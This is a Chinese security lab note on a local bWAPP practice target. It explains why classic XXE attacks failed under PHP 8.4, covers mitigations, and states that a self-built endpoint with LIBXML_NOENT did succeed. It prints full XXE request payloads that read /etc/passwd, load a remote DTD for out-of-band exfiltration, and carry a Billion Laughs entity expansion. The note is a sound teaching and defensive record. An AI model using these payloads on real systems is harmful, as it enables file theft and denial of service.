# 未复现笔记：bWAPP XXE 外部实体（file:// 读文件 / 远程 DTD / OOB 外带 / 实体放大）在本环境全部被打断

- **笔记编号**：N-B03 / N-B04 / N-B05（Loop 3 B 档阴性归档，t5）
- **靶场**：Kali VM `dc1` 内 bWAPP，`http://192.168.56.101/bWAPP/`（宿主侧）/ `http://127.0.0.1/bWAPP/`（VM 内）
- **应用**：bWAPP **原生关卡** `/var/www/html/bWAPP/xxe-1.php` + `xxe-2.php`
- **定性**：**未复现（阴性）** —— 教科书 XXE 的三条主攻击链在本运行时**全部未成立**
- **危害等级**：**无（阴性结论）**。本文只记录"打不出来"及其原因，**不构成漏洞报告**
- **配套阳性笔记**：`security/learning/xxe/B2-XXE-01-bWAPP原生XXE关卡实体展开与外部实体阻断.md`（内部实体 5/5 成立，故定 **Low**，2026-10-12 由 Medium 下调）

> **本篇的价值**：阴性结论和阳性结论同等重要。**"XXE 关卡存在" ≠ "XXE 可利用"** —— 这条不写清楚，下游一定会把 bWAPP 误报成 Critical。**（2026-10-12 补：本篇据此把配套笔记定级从 Medium 进一步下调到 Low，见该笔记 §1.2）**

---

## 1. 概述与等级

**三条攻击链，逐条未复现**：

| 编号 | 攻击链 | 档位 | 尝试 | 结果 |
|---|---|---|---|---|
| **N-B03** | 外部实体 `SYSTEM "file:///etc/passwd"` 读文件 | low / medium | 各 3 轮 | **全部未展开**，响应中无 `root:x:0:0`；low 级返回 `An error occured!` |
| **N-B04** | 远程 DTD / OOB 数据外带 | low / medium / high | 各 1–3 轮 | **接收端 0 命中**（`oob_new: 0`），**连 DTD 都没去取** |
| **N-B05** | 实体放大（Billion Laughs） | low / medium / high | 各 1–3 轮 | **未展开**，无指数膨胀，接收端 0 命中 |

**已成立的只有一条**：**内部实体**可展开（5/5 受控回显，见配套阳性笔记）。这证明解析器在工作，**但不能推断外部实体也能用**。

**等级判定**：**无危害等级**（阴性）。配套笔记 B2-XXE-01 定 **Low**（2026-10-12 由 Medium 下调）—— 读文件 6/6 不可达、SSRF/OOB 6 次 0 命中，**CWE-611 核心危害实测为零、CVSS 影响项全 N**，唯一实测影响是 low 档 `display_errors` 回显 PHP Warning 连绝对路径。**没有文件读取、没有外带实证，就不能报 Medium 及以上。**

---

## 2. 原理（为什么被挡住）

### 2.1 三条独立的缓解同时生效

| # | 机制 | 作用 | 取证 |
|---|---|---|---|
| 1 | **PHP 8 起 libxml 默认不展开 `SYSTEM` 外部实体** | 除非显式传 `LIBXML_NOENT`，否则外部实体被解析器忽略 | `php -i` / `phpversion` 实测，证据见 §3 |
| 2 | **`libxml_disable_entity_loader()` 在 PHP 8 起已废弃** | 关卡里那行**被注释掉**的调用（`xxe-2.php:78`）**在语义上已无作用** | 关卡源码，见 `loop3-b0-recon4-out.txt` |
| 3 | **`simplexml_load_string()` 未传 `LIBXML_NOENT`** | 实体替换默认关闭 | 关卡源码 |

**运行时实测**：PHP **8.4.24** + libxml **2.15.3**。

### 2.2 关卡源码（只读摘录）

```php
// /var/www/html/bWAPP/xxe-2.php
$body = file_get_contents("php://input");

if($_COOKIE["security_level"] != "1" && $_COOKIE["security_level"] != "2")
{
    ini_set("display_errors",1);
    $xml = simplexml_load_string($body);     // ← 无 LIBXML_NOENT
    $login  = $xml->login;
    $secret = $xml->secret;
    ...
}
```

```php
// xxe-2.php:78 —— 注意这行是【注释掉的】，且在 PHP 8 已废弃
// Disables XML external entities. Doesn't work with older PHP versions!
// libxml_disable_entity_loader(true);
```

**注意**：源码里 "Doesn't work with older PHP versions!" 这句注释其实写反了含义 —— 它想表达"这行在旧 PHP 上才有用"。**关卡作者本意是"故意开着外部实体"，但运行时默认行为把它堵了。**

---

## 3. 可复现 payload（对照用，均未生效）

> **写端点纪律**：打进 `<login>` 的实体展开后会出现在响应回显里，用**不存在的 login**（`LO3LVL…`）可让 `UPDATE ... WHERE login='...'` 影响 0 行 → **零写入取证**。

### N-B03 · 外部实体读文件（low）

```http
POST /bWAPP/xxe-2.php HTTP/1.1
Host: 127.0.0.1
Cookie: PHPSESSID=<bee 会话>; security_level=0
Content-Type: text/xml; charset=UTF-8

<?xml version="1.0"?><!DOCTYPE r [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<r><login>&xxe;</login><secret>Any bugs?</secret></r>
```

**实测**：响应 `An error occured!`，**无** `root:x:0:0`。

### N-B04 · 远程 DTD / OOB

```http
POST /bWAPP/xxe-2.php HTTP/1.1
Host: 127.0.0.1
Cookie: PHPSESSID=<bee 会话>; security_level=0
Content-Type: text/xml; charset=UTF-8

<?xml version="1.0"?><!DOCTYPE r [
  <!ENTITY % xxe SYSTEM "http://127.0.0.1:8099/xxe-marker.dtd">
  %xxe;
]>
<r><login>LO3OOB</login><secret>Any bugs?</secret></r>
```

**实测**：接收端 `127.0.0.1:8099` **0 命中**（`oob_new: 0`）—— **解析器根本没去取 DTD**。

### N-B05 · 实体放大

```http
POST /bWAPP/xxe-2.php HTTP/1.1
Host: 127.0.0.1
Cookie: PHPSESSID=<bee 会话>; security_level=0
Content-Type: text/xml; charset=UTF-8

<?xml version="1.0"?><!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<r><login>&lol3;</login><secret>Any bugs?</secret></r>
```

**实测**：未展开，无指数膨胀，接收端 0 命中。

---

## 4. 复现步骤与证据

| 步骤 | 动作 | 实测结果 |
|---|---|---|
| 1 | `php -v` / `php -i` 取运行时版本 | **PHP 8.4.24**、libxml **2.15.3** |
| 2 | low 档送 `file:///etc/passwd` 外部实体（3 轮） | `An error occured!`，响应**无** `root:x:0:0` |
| 3 | medium 档同 payload（3 轮） | 响应**无** `root:x:0:0` |
| 4 | 三档送远程 DTD payload（各 1–3 轮） | 接收端 **`oob_new: 0`**，零 DTD 拉取 |
| 5 | 三档送实体放大 payload | 未展开，无膨胀 |
| 6 | 内部实体对照（唯一成立的路径） | `LO3-INTERNAL-CANARY-9911` 回显 ✅（见 B2 笔记） |
| 7 | 接收端最终状态 | `sink_hits_total: 0`（原生关卡全程零命中） |

**复现率口径**：以上均为**固定轮次的阴性判定**（"尝试 N 次、命中 0 次"），**不是概率结论，不写 100% 也不写任何百分比命中率**。

### 4.1 原始证据（完整文件名 + sha256，**本轮独立重算**）

证据目录：`C:\Users\Administrator\Documents\deepseek-harness\default-workspace\security\learning\_evidence\`

| 证据文件 | 内容 | sha256 |
|---|---|---|
| `loop3-t4-probe2.json` | 决定性判定：内部实体回显 / `file://` 空 / 未定义实体报错 / 无 DOCTYPE 对照 | `ec21d03d66b844e4d8cee1032d56d5b3b240e1bf7206c7128095c7b85c738707` |
| `loop3-t4-probe9.json` | 远程 DTD OOB（**0 命中**）+ 版本 + 渲染对照 | `9bc4e52fef99c42a3a3a4779d99cb7d1dae488b86db0c5d08f10131459758ac3` |
| `loop3-t4-probe9-sink.jsonl` | 原生关卡 OOB 探测期间接收端记录（**无 xxe 相关命中**） | `e79192488491278d08d06bb724a8631f3f0c164286eceba2c4edb3971548b18e` |
| `loop3-t4-probe11.json` | 解析器矩阵 + 教学靶点部署/源码/删除核验 | `108924d1bc00972b39b6a09ddb4b7e31ab16998231b1706fc2902998a107afe6` |
| `loop3-t4-probe13.json` | 复现率：内部实体 5/5、外部实体 low 3/3 + medium 3/3 **未展开** | `74aeab1389021ff6dc41ebc33b3456469ce49c0a07b03abf31dc2054be3a4d37` |
| `loop3-b0-recon4-out.txt` | `xxe-1.php` / `xxe-2.php` 源码全文 | `fc55d98a9d638c822e5d144972ccad88b8de8d52e02fa4c6f05418a768a6dad6` |

**引用存在性自检**：上述 6 个文件全部存在，**missing = 0**（见 §8）。

---

## 5. 防护机制说明（这份防护是"运行时默认"，不是开发者主动做的）

把同一套 payload 搬到**会展开外部实体**的环境（老 PHP / 显式 `LIBXML_NOENT`），结论就会反转。**本轮用自建教学靶点做了一次对照**，验证这一点：

| 用例（自建教学靶点 `/var/www/html/lo3-teach/`） | 结果 |
|---|---|
| 内部实体回显 | ✅ `LO3_TEACH_NOENT=1 LO3-INTERNAL-CANARY-9911` |
| `SYSTEM file:///etc/passwd`（**显式传 `LIBXML_NOENT`**） | ✅ **明文读取到** `root:x:0:0:root:/root:/usr/bin/zsh` |
| 同上，但**不传 flag** 的对照端点 | ❌ 无内容 → 证明差异来自 flag，不是来自靶点本身 |
| 远程 DTD（显式 `LIBXML_NOENT`） | 接收端 **1 命中** → 外部 DTD 加载确实发生 |

> ⚠️ **重要声明**：上述教学靶点是**本轮自建的对照端点，不是 bWAPP/DVWA 的漏洞**，**不计入任何应用漏洞数**。它已在测试后删除并核验 404（证据 `loop3-t4-probe11.json` → 删除核验段）。

**这条对照的价值**：它把"为什么原生关卡没打成"和"如果环境变了会怎样"两件事都钉死了 —— **阴性不是因为 payload 写错了，是因为运行时默认不展开**。

---

## 6. 修复方案（若同一模式出现在真实应用中）

1. **不传 `LIBXML_NOENT`**：这是本环境天然安全的**唯一原因**。一旦有人为了"让实体能用"加上这个 flag，XXE 立刻成立。
2. **出站限制**：`libxml_set_external_entity_loader(fn() => null)`；`DOMDocument` 配合 `LIBXML_NONET`。
3. **输入侧**：接收 XML 前校验 `Content-Type` 与结构，**拒绝含 `<!DOCTYPE` / `<!ENTITY` 的请求体**（最省事的兜底）。
4. **出口侧**：出站白名单 + 禁 `file://` 协议处理。
5. **`display_errors=Off`**：本次 low 级把 PHP Warning 连**绝对路径**一起回显（`/var/www/html/bWAPP/xxe-2.php on line 32`），属额外信息泄露，生产必须关闭。
6. **权限**：XML 解析进程不应有读 `/etc/passwd`、私钥、`.env` 的权限。
7. **注意**：PHP 8 起 `libxml_disable_entity_loader()` 已废弃（`function_exists` 仍返回 true 但语义已变），**别再依赖它**。

---

## 7. 参考链接

- bWAPP XXE 关卡源码：`/var/www/html/bWAPP/xxe-1.php`、`/var/www/html/bWAPP/xxe-2.php`（只读取证，见 `loop3-b0-recon4-out.txt`）
- **CWE-611** — Improper Restriction of XML External Entity Reference：https://cwe.mitre.org/data/definitions/611.html
- **CWE-776** — Improper Restriction of Recursive Entity References（实体放大）：https://cwe.mitre.org/data/definitions/776.html
- **CWE-295** — Improper Certificate Validation：https://cwe.mitre.org/data/definitions/295.html
- PHP `LIBXML_NOENT` / `LIBXML_NONET` 等 libxml 常量：https://www.php.net/manual/en/libxml.constants.php
- PHP `libxml_disable_entity_loader()`（PHP 8 起废弃）：https://www.php.net/manual/en/function.libxml-disable-entity-loader.php
- OWASP XXE Prevention Cheat Sheet：https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
- bWAPP 官方站点：http://www.itsecgames.com/

---

## 8. 学习要点

1. **"有 XXE 关卡" ≠ "XXE 可利用"**。必须先测解析器是否真的展开 `SYSTEM` 实体。**内部实体能展开，不能推断外部实体也能** —— 本次就是典型反例，也是最容易被误报成 Critical 的地方。

2. **要看运行时，不看关卡注释**。`xxe-2.php:78` 那行被注释掉的 `libxml_disable_entity_loader(true)` 看着像"故意开着"，但 PHP 8.4 的默认行为已经把它堵了。**注释表达的是作者的意图，运行时决定的是实际行为**。

3. **阴性结论要配一个"能成的对照"**。本次用自建教学靶点（显式传 `LIBXML_NOENT`）打通了同一条链，立刻证明**payload 本身没写错**，阴性归因于运行时而非测试方法 —— **这是阴性留证最有价值的形式**。

4. **自建靶点必须显式标注且不计数**。教学端点的漏洞不是被测应用的漏洞；计数、归档、命名都要分开，且测试后立即拆除 + 核验 404。

5. **零写入取证**：写端点用**不存在的 login** 触发展开并读响应回显，`UPDATE` 影响 0 行。⚠️ 但要注意 medium/high 分支**忽略 XML 里的 `<login>`、改用 `$_SESSION["login"]`** —— 那条路径会真实写库（本轮踩到过，已复原并如实记录）。

6. **别把"接收端 0 命中"简单写成"外带失败"**。本例是**连 DTD 都没去取**（`oob_new: 0`），说明解析器在更早的阶段就放弃了 —— 两者根因不同，报告里要分开写。

---

## 9. 引用存在性自检（可复跑）

```powershell
$root = 'C:\Users\Administrator\Documents\deepseek-harness\default-workspace'
$refs = @('loop3-t4-probe2.json','loop3-t4-probe9.json','loop3-t4-probe9-sink.jsonl',
          'loop3-t4-probe11.json','loop3-t4-probe13.json','loop3-b0-recon4-out.txt')
$missing = @($refs | Where-Object { -not (Test-Path -LiteralPath "$root\security\learning\_evidence\$_") })
"refs=$($refs.Count)  missing=$($missing.Count)"
$missing | ForEach-Object { "MISSING: $_" }
```

**本轮实测输出**：`refs=6  missing=0`
